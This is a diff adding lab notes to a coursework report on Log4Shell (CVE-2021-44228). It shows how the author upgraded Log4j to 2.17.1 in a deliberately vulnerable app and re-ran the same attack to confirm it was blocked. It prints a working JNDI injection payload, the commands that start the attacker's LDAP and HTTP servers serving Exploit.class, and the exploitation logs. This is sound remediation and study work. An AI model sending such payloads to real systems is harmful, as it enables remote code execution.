@@ -208,9 +208,9 @@ This lines up with vendor guidance: **the main remediation is to upgrade Log4j t
 
 ---
 
-## 6. How to describe this in your report / demo
+## 6. Describe this in your report / demo
 
-You can summarise the “patch & retest” story like this:
+Summarise the “patch & retest”:
 
 1. **Initial state (vulnerable)**
 
@@ -240,3 +240,157 @@ You can summarise the “patch & retest” story like this:
    * This demonstrates that **upgrading Log4j** (rather than relying on JVM quirks or partial mitigations) effectively blocks the Log4Shell exploit path, even though the application logic and the incoming payload remain unchanged.
 
 ---
+
+Report / lab notes that demonstrates patching Log4j and re-testing with the same payload.
+
+---
+
+### Patching Log4j and Re-Testing with the Same Payload
+
+After successfully reproducing the Log4Shell exploitation chain against the vulnerable application, the next step was to apply a proper Log4j patch and verify that the same payload no longer produced any JNDI / LDAP activity.
+
+#### 1. Upgrading Log4j in the vulnerable application
+
+The sample application `log4shell-vulnerable-app` is a Spring Boot project that originally depended on Log4j 2.14.1 via `spring-boot-starter-log4j2:2.6.1`. To mitigate CVE-2021-44228, I forced all Log4j dependencies to version **2.17.1** using Gradle’s dependency resolution:
+
+```groovy
+// build.gradle – added at the bottom (top-level)
+configurations.all {
+    resolutionStrategy.eachDependency { DependencyResolveDetails details ->
+        if (details.requested.group == 'org.apache.logging.log4j') {
+            details.useVersion '2.17.1'
+            details.because 'Upgrade Log4j to >= 2.17.1 to mitigate Log4Shell'
+        }
+    }
+}
+```
+
+The application was then rebuilt:
+
+```bash
+cd /opt/log4shell/log4shell-vulnerable-app
+cp build.gradle build.gradle.bak-before-log4j-patch
+./gradlew clean build
+```
+
+To confirm the patch, I inspected the resulting fat JAR:
+
+```bash
+jar tf build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar | grep 'log4j-core'
+```
+
+Output:
+
+```text
+BOOT-INF/lib/log4j-core-2.17.1.jar
+```
+
+This shows that the application is now using **log4j-core-2.17.1** instead of the vulnerable 2.14.1.
+
+#### 2. Restarting the application with the patched JAR
+
+Any previously running instance was stopped and the app restarted with the new JAR:
+
+```bash
+pkill -f 'log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar' || true
+
+cd /opt/log4shell
+./run-vulnerable-app.sh
+```
+
+A quick smoke test confirmed the app was up on port 8080:
+
+```bash
+curl -s -D- http://127.0.0.1:8080/ | head
+```
+
+The application still returns an HTTP 400 with a JSON error body, which is expected for a missing header, indicating normal behaviour.
+
+#### 3. Re-using the exact same attack infrastructure and payload
+
+The attacker infrastructure (HTTP + LDAP) was left unchanged:
+
+```bash
+cd /opt/log4shell
+./run-http-server.sh     # serves Exploit.class on :8000
+./run-ldap-server.sh     # LDAP server on :1389
+```
+
+The **same JNDI payload** used in the vulnerable case was re-used:
+
+```bash
+export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
+./trigger-exploit.sh
+```
+
+Client-side output:
+
+```text
+[*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
+Hello, world!
+```
+
+So from the attacker’s perspective, nothing changed: same URL, same header, same payload.
+
+#### 4. Behaviour before vs after patch
+
+The key difference is visible in the logs.
+
+**Before patch (Log4j 2.14.1):**
+
+* **LDAP server log** showed callbacks from the app:
+
+  ```text
+  Listening on 0.0.0.0:1389
+  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
+  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
+  ```
+
+* **App log** showed the header being processed via Log4j:
+
+  ```text
+  HelloWorld : Received a request for API version Reference Class Name: foo
+  ```
+
+This demonstrated that Log4j was evaluating the `${jndi:…}` expression and performing an outbound LDAP lookup to attacker-controlled infrastructure.
+
+**After patch (Log4j 2.17.1):**
+
+* The **LDAP server log** after re-triggering the exploit contained only the initial startup line:
+
+  ```text
+  Listening on 0.0.0.0:1389
+  ```
+
+  No new “Send LDAP reference result…” entries were added when the payload was sent, indicating that the application no longer performed any LDAP lookup for the `${jndi:…}` string.
+
+* The **HTTP server log** remained unchanged (no new requests for `Exploit.class`), confirming that the JVM never attempted to fetch the malicious class over HTTP.
+
+* The **application log** now recorded the payload as a plain string, without triggering JNDI:
+
+  ```text
+  HelloWorld : Received a request for API version ${jndi:ldap://127.0.0.1:1389/a}
+  ```
+
+In other words:
+
+| Aspect                  | Before patch (2.14.1)                                  | After patch (2.17.1)                               |
+| ----------------------- | ------------------------------------------------------ | -------------------------------------------------- |
+| Log4j JNDI evaluation   | `${jndi:…}` evaluated, outbound LDAP performed         | `${jndi:…}` logged as a literal string             |
+| LDAP server log         | “Send LDAP reference result to http://…/Exploit.class” | Only “Listening on 0.0.0.0:1389”, no new callbacks |
+| HTTP exploit server log | (in older JDKs, would see GET /Exploit.class)          | No requests from the app for `/Exploit.class`      |
+| Payload execution       | Intended OS command via `Runtime.getRuntime().exec()`  | Not reached; `Exploit.class` never loaded/executed |
+
+#### 5. Interpretation
+
+This experiment shows a clear **before/after** effect of patching Log4j:
+
+* With **Log4j 2.14.1**, the application accepted attacker-controlled JNDI expressions via an HTTP header, evaluated them, and contacted an attacker-controlled LDAP server.
+* After upgrading to **Log4j 2.17.1**, the **same payload** is treated as plain text; no JNDI lookup occurs, no LDAP connection is made, and the malicious `Exploit.class` is never requested.
+
+This demonstrates that:
+
+1. **Vulnerability reproduction**: The original configuration allowed Log4Shell-style exploitation (inbound JNDI + outbound LDAP).
+2. **Effective mitigation**: A straightforward library upgrade (forcing Log4j to 2.17.1) is sufficient to break the exploitation path completely, even though the application code and the attacker’s payload remain unchanged.
+
+Cite these logs and steps directly as your **“Demonstrate patching of Log4j and re-testing with the same payload”** evidence for Task 2.
